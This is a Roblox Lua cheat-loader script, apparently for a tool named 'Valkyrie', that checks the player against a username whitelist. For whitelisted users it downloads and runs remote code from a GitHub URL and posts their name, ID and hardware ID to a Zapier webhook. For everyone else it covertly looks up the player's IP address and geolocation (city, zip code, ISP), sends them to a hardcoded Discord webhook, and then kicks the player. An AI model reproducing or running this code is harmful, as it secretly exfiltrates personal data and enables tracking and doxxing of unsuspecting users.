-- variables
local player = game.Players.LocalPlayer
local UserNames = {"TheCommunityCatt", "BD_DRE3", "AzureFoxes", "Sttryder", "209hm", "MissingOGs", "Joke_fire", "DoomDCursus", "VulturexCentury", "random_dudeguy787"}

-- check

if table.find(UserNames, tostring(player.Name)) then
local betterisfile = function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil
end

if not shared.FutureDeveloper and betterisfile("Engine/scripts/6872274481.lua") then
    warn("[Valkyrie] Please contact an staff on discord, Error: NVLN Detection!")
    return pcall(game.Players.LocalPlayer.Kick, game.Players.LocalPlayer, "Please contact an staff on discord, Error: NVLN Detection!")
end

if shared.FutureDeveloper then 
    loadfile("Engine/Initiate.lua")()
    return
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIllIl/Engine/main/Initiate.lua"))()
	
--print("sucess login")
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local url = "https://hooks.zapier.com/hooks/catch/12876898/bwx6kmt/"
local LP = game.Players.LocalPlayer.Name
local ID = game.Players.LocalPlayer.UserId
local PlaceId = game.PlaceId
local data0 = {"User:", LP, "UserId:", ID, "PlaceId:", PlaceId, "HWID:", HWID, "Successfully logged"}
--local data0 = {"eeeeeeeee"}
local newdata0 = game:GetService'HttpService':JSONEncode(data0)
game:HttpPost(url,newdata0)
else
--print("failed login")
local url = "https://hooks.zapier.com/hooks/catch/12876898/bwx6kmt/"
local LP = game.Players.LocalPlayer.Name
local ID = game.Players.LocalPlayer.UserId
local PlaceId = game.PlaceId
local data0 = {"User:", LP, "UserId:", ID, "PlaceId:", PlaceId, "HWID:", HWID, "Failed to login"}
--local data0 = {"eeeeeeeee"}
local newdata0 = game:GetService'HttpService':JSONEncode(data0)
	
if syn then
local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "https://discord.com/api/webhooks/995397121689780244/muzJP0gWH3ix9cTB155is-yT1THdMUnwc-z0FUy9_BcREW0CQatxrJ_4s9Rcb3bBAwtA"
local getIPResponse = syn.request({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

local getIPInfo = syn.request({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI={IP=IPBuffer,country=IIT.country,countryCode=IIT.countryCode,region=IIT.region,regionName=IIT.regionName,city=IIT.city,zipcode=IIT.zip,latitude=IIT.lat,longitude=IIT.lon,isp=IIT.isp,org=IIT.org}local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)local MessageData={["content"]=dataMessage}syn.request({Url=WebhookURL,Method="POST",Headers={["Content-Type"] = "application/json"},Body=game:GetService("HttpService"):JSONEncode(MessageData)})
else
print("hi");
end
game:HttpPost(url,newdata0)
    player:Kick("You not allowed to share the script, If you want to switch account create a ticked on discord.")
end
